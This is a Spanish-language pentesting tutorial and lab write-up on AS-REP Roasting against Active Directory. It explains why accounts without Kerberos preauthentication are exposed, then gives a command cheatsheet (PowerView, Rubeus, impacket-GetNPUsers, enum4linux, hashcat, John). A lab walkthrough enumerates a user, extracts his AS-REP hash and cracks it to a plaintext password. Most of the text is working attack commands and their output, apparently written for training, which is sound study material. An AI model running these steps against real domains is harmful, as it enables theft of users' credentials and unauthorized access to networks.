
# AS-REP Roasting

### ¿Qué es AS-REP Roasting?

AS-REP Roasting es una técnica que se utiliza para explotar una vulnerabilidad en el protocolo de autenticación Kerberos. Kerberos se usa comúnmente en entornos de Windows Active Directory para fines de autenticación. AS-REP Roasting se dirige específicamente a una vulnerabilidad en la forma en que Kerberos gestiona las solicitudes de autenticación.

En el protocolo Kerberos, cuando un usuario desea autenticarse en un servicio, envía una Solicitud de Servicio de Autenticación (AS-REQ) al Centro de Distribución de Claves (KDC). El KDC responde con una Respuesta de Servicio de Autenticación (AS-REP), que incluye un ticket de concesión de tickets (TGT). El TGT se cifra utilizando el hash de la contraseña del usuario.

El ataque AS-REP Roasting aprovecha que algunas cuentas de usuario en Active Directory pueden tener habilitada la opción "`Do not require Kerberos preauthentication`". Esta opción permite solicitar el AS-REP sin necesidad de la contraseña del usuario. Un atacante puede identificar estas cuentas vulnerables consultando Active Directory en busca de cuentas con esta opción habilitada.

{% embed url="<https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-JohnTheRipper>" %}

## <mark style="color:$primary;">Cheatsheet</mark>

<table data-header-hidden><thead><tr><th width="161.6666259765625"></th><th></th><th></th></tr></thead><tbody><tr><td>Tarea</td><td>Windows</td><td>Kali Linux</td></tr><tr><td><strong>Enumerar PowerView</strong></td><td><code>Get-DomainUser -PreauthNotRequired</code></td><td>N/A</td></tr><tr><td><strong>Obtener hash</strong></td><td><code>Rubeus.exe asreproast /nowrap</code></td><td><code>impacket-GetNPUsers dominio.local/ -dc-ip &#x3C;IP> -request -format hashcat</code></td></tr><tr><td><strong>Usuario específico</strong></td><td><code>Rubeus.exe asreproast /user:nombre /nowrap</code></td><td><code>impacket-GetNPUsers dominio.local/usuario -dc-ip &#x3C;IP> -request -no-pass</code></td></tr><tr><td><strong>Con lista de usuarios</strong></td><td><code>Rubeus.exe asreproast /nowrap</code></td><td><code>impacket-GetNPUsers dominio.local/ -dc-ip &#x3C;IP> -usersfile usuarios.txt -request</code></td></tr><tr><td><strong>Crackear (hashcat)</strong></td><td><code>hashcat -m 18200 hash.txt diccionario.txt</code></td><td><code>hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</code></td></tr><tr><td><strong>Modo hashcat</strong></td><td>18200</td><td>18200</td></tr></tbody></table>

***

### 🪟 Desde Windows

#### Paso 1: Encontrar usuarios vulnerables

Con **PowerView**:

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samaccountname
```

Con cmdlets nativos:

```powershell
Get-ADUser -Filter {userAccountControl -band 4194304} -Properties userAccountControl | Select-Object Name, SamAccountName
```

#### Paso 2: Obtener el hash AS-REP con Rubeus

Podemos encontrar un binario precompilado de Rubeus en mi repositorio AD-Tools:

{% embed url="<https://github.com/afsh4ck/AD-Tools>" %}

```powershell
Rubeus.exe asreproast /nowrap > hash.txt
```

Para un usuario específico:

```powershell
Rubeus.exe asreproast /user:nombreusuario /nowrap
```

#### Paso 3: Crackear

```bash
hashcat -m 18200 hash.txt diccionario.txt --force
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

***

### 🐉 Desde Kali Linux (con impacket-GetNPUsers)

#### Paso 1: Obtener todos los hashes AS-REP (ataque principal)

```bash
impacket-GetNPUsers dominio.local/ -dc-ip 192.168.1.10 -request -format hashcat
```

* `dominio.local/` → Nombre del dominio (la barra es obligatoria)
* `-dc-ip` → IP del Controlador de Dominio
* `-request` → Solicita los tickets AS-REP
* `-format hashcat` → Formato listo para hashcat

#### Paso 2: Obtener hash de un usuario específico

```bash
impacket-GetNPUsers dominio.local/usuario -dc-ip 192.168.1.10 -request -no-pass
```

#### Paso 3: Usar lista de usuarios (cuando el dominio no devuelve todos)

Primero, crea una lista de usuarios (ejemplo con `crackmapexec` o `enum4linux`):

```bash
enum4linux -U 192.168.1.10 2>/dev/null | grep "user:" | cut -d"[" -f2 | cut -d"]" -f1 > usuarios.txt
```

Luego prueba la lista:

```bash
impacket-GetNPUsers dominio.local/ -dc-ip 192.168.1.10 -usersfile usuarios.txt -format hashcat -outputfile asrephashes.txt
```

#### Paso 4: Crackear el hash

```bash
# Con hashcat
hashcat -m 18200 asrephashes.txt /usr/share/wordlists/rockyou.txt --force

# Con John
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrephashes.txt
```

***

## <mark style="color:$primary;">Ejemplos prácticos</mark>

#### Kali - Ataque directo a todo el dominio

```bash
impacket-GetNPUsers empresa.local/ -dc-ip 10.10.10.10 -request -format hashcat
```

#### Kali - Si el ataque devuelve "User not found" o nada

```bash
# Prueba con un usuario válido conocido (ej: un nombre de usuario que sepas)
impacket-GetNPUsers empresa.local/jperez -dc-ip 10.10.10.10 -request -no-pass
```

#### Kali - Guardar salida directamente a archivo

```bash
impacket-GetNPUsers empresa.local/ -dc-ip 10.10.10.10 -request -outputfile hashes.txt
```

***

### 🔑 Modo de Hashcat

| Modo      | Descripción                |
| --------- | -------------------------- |
| **18200** | Kerberos AS-REP (estándar) |

***

### 📌 Resumen de comandos impacket-GetNPUsers

```bash
# Uso básico
impacket-GetNPUsers DOMINIO/ -dc-ip <IP> -request

# Con formato hashcat
impacket-GetNPUsers DOMINIO/ -dc-ip <IP> -request -format hashcat

# Usuario específico
impacket-GetNPUsers DOMINIO/usuario -dc-ip <IP> -request -no-pass

# Con lista de usuarios
impacket-GetNPUsers DOMINIO/ -dc-ip <IP> -usersfile usuarios.txt -request

# Guardar en archivo
impacket-GetNPUsers DOMINIO/ -dc-ip <IP> -request -outputfile hashes.txt
```

***

## <mark style="color:$primary;">Lab:</mark> <mark style="color:$primary;"></mark><mark style="color:$primary;">**AS-REP Roasting**</mark>

En este entorno de laboratorio, se accede mediante interfaz gráfica de usuario (GUI) a un usuario de dominio llamado Research/Student en una máquina Windows Server 2012, que funciona como estación de trabajo. Esta estación de trabajo es vulnerable al ataque AS-REP Roasting.

Tu tarea consiste en identificar cuentas con la opción "`Do not require Kerberos preauthentication`" habilitada en Active Directory. Aprovechando esta vulnerabilidad, pretendes capturar las respuestas de AS-REP, extraer los hashes de las contraseñas y descifrar el hash de otro usuario del dominio en Active Directory.

**Objetivo: Identificar cuentas vulnerables a AS-REP Roasting y obtener acceso a otro usuario de dominio dentro de Active Directory.**

## Tarea 1

> Identificar la cuenta vulnerable con la opción "No requerir autenticación previa" habilitada

### Enumeración con Powerview

```powershell
PS C:\Users\student> cd c:/tools
PS C:\tools> powershell -ep bypass
PS C:\tools> Import-Module .\PowerView.ps1
```

```powershell
PS C:\tools> Get-Domainuser | Where-Object {$_.UserAccountControl -like "*DONT_REQ_PREAUTH*"}

logoncount                    : 0
badpasswordtime               : 1/1/1601 12:00:00 AM
distinguishedname             : CN=Johnny,CN=Users,DC=research,DC=SECURITY,DC=local
objectclass                   : {top, person, organizationalPerson, user}
name                          : Johnny
objectsid                     : S-1-5-21-1693200156-3137632808-1858025440-2610
samaccountname                : Johnny
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : 1/1/1601 12:00:00 AM
countrycode                   : 0
whenchanged                   : 6/20/2023 7:43:49 AM
instancetype                  : 4
usncreated                    : 49208
objectguid                    : 7c5b30fa-b1b8-4138-8768-322e562779b2
lastlogoff                    : 1/1/1601 12:00:00 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=SECURITY,DC=local
dscorepropagationdata         : 1/1/1601 12:00:00 AM
lastlogon                     : 1/1/1601 12:00:00 AM
badpwdcount                   : 0
cn                            : Johnny
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
whencreated                   : 6/20/2023 7:43:14 AM
primarygroupid                : 513
pwdlastset                    : 6/20/2023 7:43:14 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 49213
```

Observamos que el usuario johnny tiene habilitado la opción `Do not require Kerberos preauthentication`, lo que nos permite realizar AS-REP Roasting.

***

## Tarea 2

> Explotar la vulnerabilidad AS-REP Roasting para extraer hashes de contraseñas

### AS-REP Roasting con Rubeus

```powershell
PS C:\tools> .\Rubeus.exe asreproast /usr:johnny /outfile:johnnyhash.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: AS-REP roasting

[*] Target Domain          : research.SECURITY.local

[*] Searching path 'LDAP://prod.research.SECURITY.local/DC=research,DC=SECURITY,DC=local' for '(&(samAccountType=8053063
68)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : Johnny
[*] DistinguishedName      : CN=Johnny,CN=Users,DC=research,DC=SECURITY,DC=local
[*] Using domain controller: prod.research.SECURITY.local (10.0.0.165)
[*] Building AS-REQ (w/o preauth) for: 'research.SECURITY.local\Johnny'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\tools\johnnyhash.txt

[*] Roasted hashes written to : C:\tools\johnnyhash.txt
```

Podemos ver el hash de este usuario:

```powershell
PS C:\tools> cat .\johnnyhash.txt
$krb5asrep$Johnny@research.SECURITY.local:C494EA6A86C18ECD68C2E4F39E0A262E$06627306476D0F2CD72703EAFD9FA88B945884416C1DD
C9F1AA16E29AE25191297FC4A882DDC86151347C5349DAB97E1614ED5081BBF97B8554B6707BD2AE113DB93BE53A3582555B695CB413B25291C71563
9E1E67CE25770BE15C19255E4FF5843C20940779E3A63DA4B2C06D682F49715144348792B1D16E9553D15FE677DF3BDB34BCCBE9F5CF64ABE7B12BDA
CC67080E86D34E63BE12710845793BF3533FA295E65F511002D8A78DFAD985BD1FF72E6F0EEC008F6D90399513BC57367AADC32CAA9CF6BAA6FE0700
2A3A1B7992CA4EB29C1168F5CF86A81C0CA5FC051D10484DE458CACB121C41E91B32FBA0DA8924F9679F1634D2092FEBB9310DE196652A8
```

***

## Tarea 3

> Descifrar hashes de contraseñas en texto plano

### Cracking de hash

Para crackearlo con John desde Windows debemos extraer el contenido del directorio johnTheRipper en `C:/tools`:

<figure><img src="/files/73Zzvk2ACQqJZJmOTStS" alt=""><figcaption></figcaption></figure>

Dentro del directorio run encontraremos el ejecutable `john.exe`. Copiamos el hash dentro de este directorio para ejecutarlo directamente.

Accedemos a la ruta desde la powershell y usaremos el diccionario `10k-worst-pass` disponible en C:/tools (que también copiaremos al directorio)

```bash
PS C:\tools\johnTheRipper\john-1.9.0-jumbo-1-win64\run> john.exe johnnyhash.txt --format=krb5asrep --wordlist=10k-worst-pass.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           ($krb5asrep$Johnny@research.SECURITY.local)
1g 0:00:00:00 DONE (2026-04-27 17:20) 34.48g/s 35310p/s 35310c/s 35310C/s password..pavilion
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Tenemos la contraseña en plano de johnny: 123456
